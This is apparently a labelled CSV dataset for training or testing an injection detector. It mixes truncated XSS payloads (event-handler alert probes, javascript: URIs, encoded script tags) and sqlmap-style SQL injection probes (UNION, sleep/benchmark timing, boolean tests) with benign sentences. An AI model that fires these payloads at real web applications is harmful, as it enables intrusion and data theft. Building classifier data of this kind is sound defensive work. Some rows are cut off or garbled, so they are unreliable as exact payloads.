Payload,Label,text_label,ID
<a onpointermove=alert(1)>XSS</a>,1,XSS,7548
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10764
"1' ) ) union all select null,null,null,null,null,n",2,SQLi,18659
<xmp onpointerdown=alert(1)>XSS</xmp>,1,XSS,3280
"1%"" ) ) ) or 5356 = ( select count ( * ) from sysu",2,SQLi,15712
"<img SRC="" &#14; javascript:document.vulnerable=tr",1,XSS,1477
"1"" ) as ybkp where 7788 = 7788 or 8466 = benchmark",2,SQLi,18288
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>,1,XSS,867
"1' in boolean mode ) union all select null,null,nu",2,SQLi,19787
"{""id"":null,""name"":""direct class""}",0,normal,27172
<param onpointerup=alert(1)>XSS</param>,1,XSS,6337
ORDER BY 27#,2,SQLi,10300
"<style>@keyframes x{}</style><menu style=""animatio",1,XSS,8234
"<i ondblclick=""alert(1)"">test</i>",1,XSS,2407
"-6720' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, (",2,SQLi,18976
"<style>@keyframes x{}</style><nav style=""animation",1,XSS,4391
-1166' ) ) as icdz where 1042 = 1042 union all sel,2,SQLi,17587
1 union all select null--,2,SQLi,18493
<button onFocusIn=javascript:alert(1)>,1,XSS,9617
"<font draggable=""true"" ondrag=""alert(1)"">test</fon",1,XSS,7910
#ERROR!,2,SQLi,10951
"<basefont onbeforepaste=""alert(1)"" contenteditable",1,XSS,2804
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10614
<tt id=x tabindex=1 onfocusin=alert(1)></tt>,1,XSS,5045
"{""id"":null,""name"":""Bibarel""}",0,normal,26910
"-4705' where 2029 = 2029 union all select 2029,202",2,SQLi,15801
<tr onpointerenter=alert(1)>XSS</tr>,1,XSS,3775
1 ) where 3979 = 3979 rlike sleep ( 5 ) --,2,SQLi,18943
Select finish.,0,normal,24584
`'><script>\xE2\x80\xAFjavascript:alert(520)</scri,1,XSS,8988
<content id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,5407
waitfor delay '0:0:5' and ( 'gpqx' like 'gpqx,2,SQLi,15325
-4494 or 5291 = 4452,2,SQLi,14978
Universal Studios Hollywood Halloween Horror Night,0,normal,25223
1'|| ( select 'rjun' where 8868 = 8868 and 3715 in,2,SQLi,22199
There are three funeral packages to choose from or,0,normal,25334
1'+ ( select zukr where 9215 = 9215 or char ( 68 ),2,SQLi,16116
1'|| ( select 'cjwx' from dual where 7637 = 7637 a,2,SQLi,14970
"-7448 union all select 4072,4072#",2,SQLi,16653
"<tt onmouseover=""alert(1)"">test</tt>",1,XSS,1738
1'|| ( select 'sxya' where 3578 = 3578,2,SQLi,18738
"Select ""Security"" and press X. On the next screen,",0,normal,25671
"1"" ) where 2837 = 2837 and ( 3020 = 3020 ) *6703--",2,SQLi,17793
"{""id"":null,""name"":""Avocet""}",0,normal,27617
1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||,2,SQLi,14604
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,12117
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;),1,XSS,1390
-5365 or 7517 = 5726--,2,SQLi,15966
"<img src=x\x12onerror=""javascript:alert(1)"">",1,XSS,675
"<isindex onpaste=""alert(1)"" contenteditable>test</",1,XSS,7799
1' where 9216 = 9216,2,SQLi,13915
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos,1,XSS,1439
"<style>@keyframes slidein {}</style><div style=""an",1,XSS,7661
<blink id=x tabindex=1 ondeactivate=alert(1)></bli,1,XSS,4775
He'll select wine.,0,normal,24425
"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",1,XSS,9707
All clothing and accessories available at select C,0,normal,26392
"<fieldset onbeforecut=""alert(1)"" contenteditable>t",1,XSS,6717
"<form onmouseup=""alert(1)"">test</form>",1,XSS,3247
select,0,normal,26612
1' ) where 8575 = 8575 and 3715 in ( ( char ( 113 ,2,SQLi,17409
"1%"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( """,2,SQLi,20138
"1%"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +",2,SQLi,12759
"The governing body consisted of 180 members, chose",0,normal,25438
"<ul oncontextmenu=""alert(1)"">test</ul>",1,XSS,3532
"<noembed onbeforepaste=""alert(1)"" contenteditable>",1,XSS,2776
"1 ) ) ) union all select null,null,null,null,null,",2,SQLi,20634
1 ) as qeav where 8127 = 8127 and 4241 = convert (,2,SQLi,17531
-6865 ) or ( 8459 = 8459 ) *4906 and ( 6107 = 6107,2,SQLi,12295
Immediately afterward he was a member of a commiss,0,normal,26033
I need to decide where to plant new flowers.,0,normal,23680
<title onpointerover=alert(1)>XSS</title>,1,XSS,6546
"1"" where 1140 = 1140 or 2367 = ( select count ( * ",2,SQLi,22162
<del onpointerenter=alert(1)>XSS</del>,1,XSS,3021
"<s ondblclick=""alert(1)"">test</s>",1,XSS,5071
"<rb onmouseover=""alert(1)"">test</rb>",1,XSS,8250
Select educate.,0,normal,24714
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxu",1,XSS,296
1' ) as hcpp where 1863 = 1863,2,SQLi,18045
"<html onmouseenter=""alert(1)"">test</html>",1,XSS,4229
or 'x' = 'x,2,SQLi,11944
1 ) and ( 3020 = 3020 ) *6703,2,SQLi,17560
"<ul onmouseover=""alert(1)"">test</ul>",1,XSS,7320
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,7333
"1%"" ) ) ) union all select null,null,null,null,nul",2,SQLi,19943
"-7101 ) ) ) union all select 4587,4587,4587,4587,4",2,SQLi,14838
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) ",2,SQLi,18705
1' where 8159 = 8159 union all select null#,2,SQLi,18495
"<thead onkeydown=""alert(1)"" contenteditable>test</",1,XSS,1954
<svg><xmp onload=alert(1)></xmp>,1,XSS,8836
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1",1,XSS,536
"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",1,XSS,3700
-9046' ) ) as ymqc where 3733 = 3733 union all sel,2,SQLi,13003
1' ) and 6414 = ( select count ( * ) from rdb$fiel,2,SQLi,21847
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,1,XSS,2671
"<x 1=""1""onxxx=1",1,XSS,9332
-6843' or 2724 in ( ( char ( 113 ) +char ( 113 ) +,2,SQLi,16469
1 WAITFOR DELAY '0:0:5',2,SQLi,11319
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&g,1,XSS,972
1' ) ) as jxvv where 6593 = 6593 or elt ( 6272 = 6,2,SQLi,14766
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,6850
"<figcaption onkeypress=""alert(1)"" contenteditable>",1,XSS,2876
"1%"" ) rlike ( select * from ( select ( sleep ( 5 )",2,SQLi,17175
-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast,2,SQLi,17936
"<style>@keyframes x{}</style><mark style=""animatio",1,XSS,6209
1' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) -,2,SQLi,17081
<track onpointerleave=alert(1)>XSS</track>,1,XSS,4754
"1"" ) as rbgl where 3822 = 3822 procedure analyse (",2,SQLi,17898
Select the best location.,0,normal,24476
"<style>@keyframes x{}</style><article style=""anima",1,XSS,8591
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""f",1,XSS,431
-5962 ) ) as jbqv where 2583 = 2583 or 7496 = 8560,2,SQLi,12841
-8056 ) ) as botl where 9225 = 9225 or ( 1182 = 76,2,SQLi,17711
"From here, select the data-hogging apps and disabl",0,normal,26164
<style>:target {color: red;}</style><footer id=x s,1,XSS,2742
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",1,XSS,8467
"""More specifically, we began to adjust prices on s",0,normal,26457
1' ) ) and 8514 = ( select count ( * ) from domain,2,SQLi,15184
ORDER BY 27,2,SQLi,10331
1 ) ) as rqbo where 2243 = 2243 and exp ( ~ ( sele,2,SQLi,18162
<listing id=x tabindex=1 onactivate=alert(1)></lis,1,XSS,7594
<style>:target {color:red;}</style><article id=x s,1,XSS,4542
"-6546"" ) order by 1#",2,SQLi,18109
--><!-- --\x21> <img src=xxx:x onerror=javascript:,1,XSS,424
"<header oncontextmenu=""alert(1)"">test</header>",1,XSS,2351
1' ) where 1212 = 1212,2,SQLi,13690
"<td draggable=""true"" ondrag=""alert(1)"">test</td>",1,XSS,2450
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,20300
"<img src=""Mario Heiderich says that svg SHOULD not",1,XSS,1359
</title><SCRIPT>document.vulnerable=true;</script>,1,XSS,1485
"{""id"":null,""name"":""Dugong""}",0,normal,27278
"<source onkeydown=""alert(1)"" contenteditable>test<",1,XSS,7688
I need to select the right words for the speech.,0,normal,23711
1 where 3027 = 3027 and 4595 = 4595#,2,SQLi,21530
1 ) where 1880 = 1880 and 8312 = dbms_pipe.receive,2,SQLi,20534
"{""id"":null,""name"":""GroundLocomon""}",0,normal,27167
"1%"" ) ) ) and row ( 6237,7469 ) > ( select count (",2,SQLi,19836
"<link onkeyup=""alert(1)"" contenteditable>test</lin",1,XSS,3514
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10823
"-4072%"" ) ) ) or 3999 = 1979",2,SQLi,17287
"<form><button formaction=""javascript:javascript:al",1,XSS,625
-7999 ) or 8422 = 1336,2,SQLi,12142
I'm considering where to have the team-building ev,0,normal,23964
"UNION ALL SELECT 1,2,3--",2,SQLi,10565
"1"" where 4298 = 4298 order by 1--",2,SQLi,15347
"Currently, you can take $100-$79.993 off select Pl",0,normal,26257
1' in boolean mode ) and 8635 = ( select count ( *,2,SQLi,20734
"<caption draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,4988
"onfocus=alert(document.domain) > <""",1,XSS,1313
"<template onbeforepaste=""alert(1)"" contenteditable",1,XSS,4519
-8860 ) or 4144 = ( select upper ( xmltype ( chr (,2,SQLi,22188
-5866' ) ) as phzq where 3803 = 3803 union all sel,2,SQLi,16158
"<div STYLE=""background-image: url(&#1;javascript:d",1,XSS,1505
"<menuitem draggable=""true"" ondragenter=""alert(1)"">",1,XSS,4993
"-3749"" or elt ( 1032 = 1032,3623 ) and ""mzrw"" = ""m",2,SQLi,19969
"<form><isindex formaction=""javascript&colon;confir",1,XSS,837
When you select the computer that seems to fit you,0,normal,25141
Select your priority.,0,normal,24882
"1%"" ) ) and sleep ( 5 ) #",2,SQLi,17497
select ( case when ( 5142 = 6855 ) then 5142 else ,2,SQLi,18194
To see the final sculptures from this studio scene,0,normal,25258
<button onRedo=javascript:alert(1)>,1,XSS,9651
"<div style=""binding: url([link to code]);"">",1,XSS,1535
From the mass of material comprised in the Koran -,0,normal,26159
1 ) ) as xroy where 3274 = 3274,2,SQLi,22049
"1 ) ) ) and make_set ( 8882 = 1593,1593 ) and ( ( ",2,SQLi,20204
"<style>@keyframes x{}</style><menu style=""animatio",1,XSS,8742
") ) or benchmark ( 10000000,MD5 ( 1 ) ) #",2,SQLi,12061
1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 whe,2,SQLi,12293
"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x7655564",2,SQLi,19078
Where's the hiking trail?,0,normal,23595
admin' or ',2,SQLi,10097
1 ) ) ) and ( select 2* ( if ( ( select * from ( s,2,SQLi,15516
"<style>@keyframes x{}</style><object style=""animat",1,XSS,8206
"1"" ) as ipxg where 4031 = 4031 and 6537 = dbms_pip",2,SQLi,15547
-5534 or 1983 = 5721#,2,SQLi,13592
Filter the noisy data.,0,normal,22567
"<br onkeyup=""alert(1)"" contenteditable>test</br>",1,XSS,4073
select * from users where id = '1' union select 1a,2,SQLi,11772
"{""id"":null,""name"":""Horsea""}",0,normal,26795
&lt;? echo('&lt;SCR)';,1,XSS,1036
Update your phone's software.,0,normal,22561
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></,1,XSS,8116
"<main onmouseover=""alert(1)"">test</main>",1,XSS,6607
"-2110' or 1 group by concat ( 0x7171706a71, ( sele",2,SQLi,12968
-9072 ) as saot where 2278 = 2278 order by 1#,2,SQLi,20021
"<big onclick=""alert(1)"">test</big>",1,XSS,2914
""" Select Medical Holdings: ""It's very good, a very",0,normal,26465
The Energy Select Sector SPDR and Financial Select,0,normal,25456
Merge the data tables for a comprehensive view.,0,normal,22923
1 ) or sleep ( 5 ) and ( 2211 = 2211,2,SQLi,21758
-3186 or 3867 = 9405,2,SQLi,15797
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10582
"1"" ) ) ) and 6414 = ( select count ( * ) from rdb$",2,SQLi,17510
<style>:target {transform: rotate(180deg);}</style,1,XSS,2292
"-8491"" where 9043 = 9043 union all select 9043,904",2,SQLi,19857
Select market.,0,normal,24550
1 ) where 9829 = 9829 or char ( 75 ) ||char ( 70 ),2,SQLi,22168
"<legend onkeypress=""alert(1)"" contenteditable>test",1,XSS,7561
"{""id"":null,""firstName"":""Alan"",""lastName"":""Meng"",""s",0,normal,26807
"-3298 union all select 7618,7618,7618,7618,7618,76",2,SQLi,21197
"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( rando",2,SQLi,18171
"{""id"":null,""firstName"":""Rajkumar"",""lastName"":""Raj""",0,normal,27285
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5198
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></",1,XSS,9059
"West Elm: Up to 25% off select furniture, and 25% ",0,normal,25168
You can select.,0,normal,24798
"<IMG SRC=x oninvalid=""alert(String.fromCharCode(88",1,XSS,1190
select * from users where id = 1 &@ or 1 = 1 -- 1,2,SQLi,11600
"<big onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,6493
<button onProgress=javascript:alert(1)>,1,XSS,9648
"<embed onmouseleave=""alert(1)"">test</embed>",1,XSS,6505
<button onURLFlip=javascript:alert(1)>,1,XSS,9675
<multicol onpointerover=alert(1)>XSS</multicol>,1,XSS,3592
"-1048%"" or 3038 = 3038",2,SQLi,14482
Where's the missing piece of artwork?,0,normal,22751
-7032' ) as xmmm where 5635 = 5635 union all selec,2,SQLi,17338
"{""id"":null,""name"":""Heatran""}",0,normal,26900
"<xml id=""xss"" src=""%(htc)s""></xml> <label dataform",1,XSS,725
1%' and 5556 = ( select count ( * ) from all_users,2,SQLi,18420
(SELECT * FROM (SELECT(SLEEP(5)))YYYY),2,SQLi,11148
document.write(213),1,XSS,5585
"<ruby onkeypress=""alert(1)"" contenteditable>test</",1,XSS,7760
<span id=x tabindex=1 onfocus=alert(1)></span>,1,XSS,8130
"1%' ) and elt ( 4249 = 4249,7259 ) and ( '%' = '",2,SQLi,12169
select ( case when ( 4341 = 7041 ) then 4341 else ,2,SQLi,16762
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( random",2,SQLi,12534
Tim Seymour was a buyer of the Financial Select Se,0,normal,25285
-3834' ) ) as hhiy where 2086 = 2086 or 3038 = 303,2,SQLi,12219
1'+ ( select shec where 3589 = 3589 and 6969 = ( s,2,SQLi,15562
"{""id"":null,""name"":""cry""}",0,normal,26823
<blockquote id=x tabindex=1 onbeforeactivate=alert,1,XSS,7589
degrees,0,normal,23220
1'|| ( select 'tkmc' from dual where 9675 = 9675 u,2,SQLi,19389
<button onBeforeDeactivate=javascript:alert(1)>,1,XSS,9582
column,0,normal,23155
"<style>@keyframes x{}</style><element style=""anima",1,XSS,3115
"-7812' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr",2,SQLi,14850
1 ) ) ) or 1022 = ( select count ( * ) from all_us,2,SQLi,15546
"{""id"":null,""name"":""unusual""}",0,normal,26758
"1%"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 )",2,SQLi,15819
<script>'alert\x281\x29'instanceof{[Symbol['hasIns,1,XSS,131
Select a route for the hiking trail.,0,normal,24226
-9432 ) ) as nqya where 8387 = 8387 or elt ( 9242 ,2,SQLi,16890
"<ol onmouseout=""alert(1)"">test</ol>",1,XSS,2406
1'+ ( select myci where 8903 = 8903,2,SQLi,18283
Join the language class for a new skill.,0,normal,22960
"1"" ) where 7471 = 7471 or char ( 75 ) ||char ( 70 ",2,SQLi,18831
"select * from users where id = 1 or 1#""$ union sel",2,SQLi,11456
"1' or 8384 = like ( 'abcdefg',upper ( hex ( random",2,SQLi,16460
"<th onmouseleave=""alert(1)"">test</th>",1,XSS,3692
1,0,normal,26707
"1"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 )",2,SQLi,16438
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10821
<style>:target {color:red;}</style><ul id=x style=,1,XSS,5946
<param onpointerenter=alert(1)>XSS</param>,1,XSS,7762
<track id=x tabindex=1 onfocusin=alert(1)></track>,1,XSS,1931
1'+ ( select 'aliz' where 5050 = 5050 or 4411 = ( ,2,SQLi,15019
if ( 4194 = 4133 ) select 4194 else drop function ,2,SQLi,18220
<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><in,1,XSS,5062
select,0,normal,26569
Select your picture.,0,normal,24979
"{""id"":null,""name"":""gradually touch""}",0,normal,27027
If you want to allow presenters to record your mee,0,normal,26042
Select Manage Profiles from the menu and select th,0,normal,25620
from,0,normal,26518
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ch",2,SQLi,18940
<xss id=x tabindex=1 onfocusout=alert(1)></xss><in,1,XSS,8852
The Energy Select Sector SPDR (XLE) traded 0.53 pe,0,normal,25457
"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ",2,SQLi,16576
"<h1 draggable=""true"" ondragenter=""alert(1)"">test</",1,XSS,8690
"She asked, ""Why is my phone slow?""",0,normal,22939
"1 where 9869 = 9869 union all select null,null#",2,SQLi,20609
1 ) ) ) and 6414 = ( select count ( * ) from rdb$f,2,SQLi,15065
"javascript:""/*`/*\""/*'/*</stYle/</titLe/</teXtarEa",1,XSS,9498
Drivers will be able to select from four different,0,normal,26227
"""We evaluate to develop, not just to select player",0,normal,26447
"<center onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,5396
1%' ) and ( 7704 = 3494 ) *3494 and ( '%' = ',2,SQLi,13444
"<IMG SRC=x oninput=""alert(String.fromCharCode(88,8",1,XSS,1189
"1"" ) ) ) and elt ( 2421 = 9612,9612 ) and ( ( ( ""g",2,SQLi,19675
Select your analyze.,0,normal,24993
-8045 ) ) ) order by 1--,2,SQLi,22449
"<% foo><x foo=""%><script>javascript:alert(1)</scri",1,XSS,650
javascript:document.location='http://www.google.co,1,XSS,7940
select,0,normal,26559
1,0,normal,26651
Let's discuss where to go for our anniversary dinn,0,normal,23918
"{""id"":null,""name"":""person""}",0,normal,27111
"<datalist onmouseover=""alert(1)"">test</datalist>",1,XSS,2394
<svg><ol onload=alert(1)></ol>,1,XSS,1875
ORDER BY 7#,2,SQLi,10280
<script> $.get('https://google.com/'); $.post('htt,1,XSS,219
<video onfullscreenchange=alert(1) src=validvideo.,1,XSS,69
admin' or '1'='1'#,2,SQLi,9907
"{""id"":null,""firstName"":""Lotus"",""lastName"":""Li"",""sp",0,normal,27029
"1', ( select ( case when ( 9443 = 9443 ) then slee",2,SQLi,12096
<head id=x tabindex=1 onbeforedeactivate=alert(1)>,1,XSS,5920
1 ) as dlkh where 6179 = 6179 and 9198 = 9198--,2,SQLi,15716
Just want to say thankyou to amazing selection for,0,normal,26492
"<footer onkeyup=""alert(1)"" contenteditable>test</f",1,XSS,4953
1 ) as bidc where 5268 = 5268 and ( select * from ,2,SQLi,19323
Select your submission.,0,normal,24944
"<wbr onkeydown=""alert(1)"" contenteditable>test</wb",1,XSS,3573
-6777%' ) or 4747 = dbms_utility.sqlid_to_sqlhash ,2,SQLi,16041
Select the right music for the occasion.,0,normal,24178
<hgroup onpointerout=alert(1)>XSS</hgroup>,1,XSS,6670
1' ) ) rlike ( select ( case when ( 7689 = 7689 ) ,2,SQLi,12784
"1"" ) ( select ( case when ( 5451 = 5451 ) then reg",2,SQLi,12495
"-1559 union all select 3985,3985,3985,3985#",2,SQLi,17503
Select a scenic route.,0,normal,22646
"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',up",2,SQLi,22095
-8760 ) where 8277 = 8277 union all select 8277--,2,SQLi,19896
"<DIV STYLE=""width: expression(alert('XSS'));"">",1,XSS,291
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10649
"<abbr onmousemove=""alert(1)"">test</abbr>",1,XSS,4907
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 11",2,SQLi,13180
"-5130' ) ) union all select 5218,5218,5218,5218,52",2,SQLi,14726
"-1033 union all select 8731,8731,8731,8731,8731,87",2,SQLi,17708
-4562' ) or 3038 = 3038,2,SQLi,16684
Where did you find that peaceful park?,0,normal,23801
1 and 1 = 1,2,SQLi,11538
<marquee onfocusout=alert(1) tabindex=1 id=x></mar,1,XSS,8060
"1%"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ",2,SQLi,20191
"<code onmousedown=""alert(1)"">test</code>",1,XSS,4705
"<textarea onkeypress=""alert(1)"" contenteditable>te",1,XSS,2056
"<rp onbeforepaste=""alert(1)"" contenteditable>test<",1,XSS,6595
1' rlike ( select * from ( select ( sleep ( 5 ) ) ,2,SQLi,20823
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10432
<label onfocusout=alert(1) tabindex=1 id=x></label,1,XSS,3233
"He became a fellow of Magdalen College, Oxford, in",0,normal,26124
Select impress.,0,normal,24728
"1 union all select null,null--",2,SQLi,18841
"1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4",2,SQLi,15009
"{""id"":null,""name"":""smooth""}",0,normal,27002
<button onDblClick=javascript:alert(1)>,1,XSS,9601
Get up to 60% off select espadrilles until Septemb,0,normal,26145
"{""id"":null,""name"":""Suicune""}",0,normal,26992
1 ) as qjjm where 3850 = 3850 or ( select 9173 fro,2,SQLi,13080
<frameset><frame id=x onfocus=alert(1)>,1,XSS,2256
<button onReverse=javascript:alert(1)>,1,XSS,9658
-6637' ) ) order by 1#,2,SQLi,12269
"<body onPageShow body onPageShow=""javascript:javas",1,XSS,388
1' ) or 8421 = ( select count ( * ) from generate_,2,SQLi,16815
<data id=x tabindex=1 ondeactivate=alert(1)></data,1,XSS,2275
<svg><form onload=alert(1)></form>,1,XSS,8671
"1' ) where 1577 = 1577 union all select null,null,",2,SQLi,12871
1 ) as jdhz where 2021 = 2021,2,SQLi,16734
1 ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( c,2,SQLi,20196
"<cite draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,7344
"<samp onmouseover=""alert(1)"">test</samp>",1,XSS,2823
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS,1,XSS,1436
<base onfocusout=alert(1) tabindex=1 id=x></base><,1,XSS,5973
<base id=x tabindex=1 ondeactivate=alert(1)></base,1,XSS,3002
"%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337",2,SQLi,11269
"<b draggable=""true"" ondragenter=""alert(1)"">test</b",1,XSS,6355
"1%"" ) ) ) or 7427 = dbms_pipe.receive_message ( ch",2,SQLi,20730
"-2766%' ) ) union all select 4458,4458,4458,4458,4",2,SQLi,16500
<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><in,1,XSS,3720
1' ) where 6440 = 6440 or ( select * from ( select,2,SQLi,22093
"-5529"" or 5903 = ( 'qqpjq'|| ( select case 5903 wh",2,SQLi,21059
"1"" ) as upyn where 6185 = 6185 union all select nu",2,SQLi,15942
